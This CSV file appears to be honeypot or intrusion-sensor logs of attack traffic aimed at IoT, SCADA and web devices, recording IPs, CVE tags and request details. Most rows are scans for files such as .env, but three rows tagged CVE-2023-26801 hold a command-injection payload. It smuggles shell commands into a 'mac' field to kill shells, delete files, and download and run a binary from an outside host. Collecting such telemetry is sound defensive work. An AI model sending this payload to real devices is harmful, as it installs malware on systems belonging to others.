local_ip,remote_ip,remote_port,local_port,tag_label,attack_time,target_profile,node_id,ASN,attack_data,method,path,User-Agent,Accept-Encoding,Accept,Qualys-Scan,Content-Length,Content-Type,Referrer,Host,body
103.7.128.35,164.90.188.49,41684,80,CID-1032,2023-11-01T00:00:55,device:iot:Printer:HPLaserJet,168,AS14061,"{'method': 'GET', 'path': '/files/', 'headers': {'Host': '103.7.128.35', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', 'Accept': '*/*', 'Accept-Encoding': 'gzip'}}",GET,/files/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",gzip,*/*,,,,,103.7.128.35,
103.7.128.35,164.90.188.49,41686,80,CID-980,2023-11-01T00:00:55,device:iot:Printer:HPLaserJet,168,AS14061,"{'method': 'GET', 'path': '/files/', 'headers': {'Host': '103.7.128.35', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', 'Accept': '*/*', 'Accept-Encoding': 'gzip'}}",GET,/files/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",gzip,*/*,,,,,103.7.128.35,
115.112.148.214,89.190.156.170,56272,8080,CVE-2023-26801,2023-11-01T00:25:50,device:web:server:Apache,105,AS49870,"{'method': 'POST', 'path': '/goform/set_LimitClient_cfg', 'headers': {'Host': '115.112.148.214:8080', 'User-Agent': 'Go-http-client/1.1', 'Content-Length': '201', 'Cookie': 'user=admin', 'Accept-Encoding': 'gzip'}, 'body': b'dGltZTE9MDA6MDAtMDA6MDAmdGltZTI9MDA6MDAtMDA6MDAmbWFjPTtraWxsYWxsIC05IC9iaW4vc2g7IGtpbGxhbGwgLTkgL3ovYmluOyBraWxsYWxsIC05IC9iaW4vYmFzaDsgcm0gLXJmICptcHNsKjsgd2dldCBodHRwOi8vYm9hdHMuZG9nbXVuY2hlci54eXovQXF1YS5tcHNsOyBjaG1vZCA3NzcgQXF1YS5tcHNsOyAuL0FxdWEubXBzbCBsYmxpbms7'}",POST,/goform/set_LimitClient_cfg,Go-http-client/1.1,gzip,,,201,,,115.112.148.214:8080,time1=00:00-00:00&time2=00:00-00:00&mac=;killall -9 /bin/sh; killall -9 /z/bin; killall -9 /bin/bash; rm -rf *mpsl*; wget http://boats.dogmuncher.xyz/Aqua.mpsl; chmod 777 Aqua.mpsl; ./Aqua.mpsl lblink;
103.206.104.45,37.187.215.251,24179,80,CVE-2017-6884,2023-11-01T00:58:18,device:scada:plc:Delta_Electronics,95,AS16276,"{'method': 'GET', 'path': '/cgi-bin/luci', 'headers': {'Host': '103.206.104.45', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5'}}",GET,/cgi-bin/luci,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,,"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,,,,103.206.104.45,
49.248.120.5,89.190.156.170,55178,8080,CVE-2023-26801,2023-11-01T00:26:00,device:web:server:Apache,276,AS49870,"{'method': 'POST', 'path': '/goform/set_LimitClient_cfg', 'headers': {'Host': '49.248.120.5:8080', 'User-Agent': 'Go-http-client/1.1', 'Content-Length': '201', 'Cookie': 'user=admin', 'Accept-Encoding': 'gzip'}, 'body': b'dGltZTE9MDA6MDAtMDA6MDAmdGltZTI9MDA6MDAtMDA6MDAmbWFjPTtraWxsYWxsIC05IC9iaW4vc2g7IGtpbGxhbGwgLTkgL3ovYmluOyBraWxsYWxsIC05IC9iaW4vYmFzaDsgcm0gLXJmICptcHNsKjsgd2dldCBodHRwOi8vYm9hdHMuZG9nbXVuY2hlci54eXovQXF1YS5tcHNsOyBjaG1vZCA3NzcgQXF1YS5tcHNsOyAuL0FxdWEubXBzbCBsYmxpbms7'}",POST,/goform/set_LimitClient_cfg,Go-http-client/1.1,gzip,,,201,,,49.248.120.5:8080,time1=00:00-00:00&time2=00:00-00:00&mac=;killall -9 /bin/sh; killall -9 /z/bin; killall -9 /bin/bash; rm -rf *mpsl*; wget http://boats.dogmuncher.xyz/Aqua.mpsl; chmod 777 Aqua.mpsl; ./Aqua.mpsl lblink;
172.16.16.48,139.59.78.189,54160,80,CID-1033,2023-11-01T00:28:46,device:iot:Printer:Epson,427,AS14061,"{'method': 'GET', 'path': '/upl.php', 'headers': {'Host': '103.58.121.48', 'User-Agent': 'Mozilla/5.0', 'Accept': '*/*', 'Accept-Encoding': 'gzip'}}",GET,/upl.php,Mozilla/5.0,gzip,*/*,,,,,103.58.121.48,
219.65.97.27,146.59.53.10,54814,80,Unsecured_ENV_file_scan,2023-11-01T00:43:27,device:iot:IPCamera:Hikvision,391,AS16276,"{'method': 'GET', 'path': '/api/.env', 'headers': {'Host': '219.65.97.27', 'User-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}}",GET,/api/.env,,"gzip, deflate",*/*,,,,,219.65.97.27,
103.216.76.18,193.35.18.187,44970,80,CID-1193,2023-11-01T01:47:05,device:iot:IPCamera:Avtech,179,AS202685,"{'method': 'CONNECT', 'path': 'google.com:443', 'headers': {'Host': 'google.com:443', 'User-Agent': 'Go-http-client/1.1'}}",CONNECT,google.com:443,Go-http-client/1.1,,,,,,,google.com:443,
122.187.29.44,165.232.104.235,59428,80,CID-1033,2023-11-01T01:37:24,device:iot:IPCamera:D-Link-DCS-5222L,208,AS14061,"{'method': 'GET', 'path': '/upl.php', 'headers': {'Host': '122.187.29.44', 'User-Agent': 'Mozilla/5.0', 'Accept': '*/*', 'Accept-Encoding': 'gzip'}}",GET,/upl.php,Mozilla/5.0,gzip,*/*,,,,,122.187.29.44,
124.247.203.139,89.190.156.170,47368,8080,CVE-2023-26801,2023-11-01T01:29:02,device:web:server:Apache,527,AS49870,"{'method': 'POST', 'path': '/goform/set_LimitClient_cfg', 'headers': {'Host': '124.247.203.139:8080', 'User-Agent': 'Go-http-client/1.1', 'Content-Length': '201', 'Cookie': 'user=admin', 'Accept-Encoding': 'gzip'}, 'body': b'dGltZTE9MDA6MDAtMDA6MDAmdGltZTI9MDA6MDAtMDA6MDAmbWFjPTtraWxsYWxsIC05IC9iaW4vc2g7IGtpbGxhbGwgLTkgL3ovYmluOyBraWxsYWxsIC05IC9iaW4vYmFzaDsgcm0gLXJmICptcHNsKjsgd2dldCBodHRwOi8vYm9hdHMuZG9nbXVuY2hlci54eXovQXF1YS5tcHNsOyBjaG1vZCA3NzcgQXF1YS5tcHNsOyAuL0FxdWEubXBzbCBsYmxpbms7'}",POST,/goform/set_LimitClient_cfg,Go-http-client/1.1,gzip,,,201,,,124.247.203.139:8080,time1=00:00-00:00&time2=00:00-00:00&mac=;killall -9 /bin/sh; killall -9 /z/bin; killall -9 /bin/bash; rm -rf *mpsl*; wget http://boats.dogmuncher.xyz/Aqua.mpsl; chmod 777 Aqua.mpsl; ./Aqua.mpsl lblink;
